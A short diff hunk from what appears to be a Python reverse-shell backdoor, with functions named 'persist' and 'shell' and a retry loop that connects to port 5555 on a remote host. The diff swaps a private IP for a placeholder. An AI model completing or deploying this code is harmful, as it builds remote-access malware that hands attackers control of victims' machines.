@@ -72,7 +72,7 @@ def persist(reg_name, copy_name):
 def connection():
     while True:
         try:
-            s.connect(('192.168.10.116', 5555))
+            s.connect(('ip address', 5555))
             shell()
             s.close()
             break
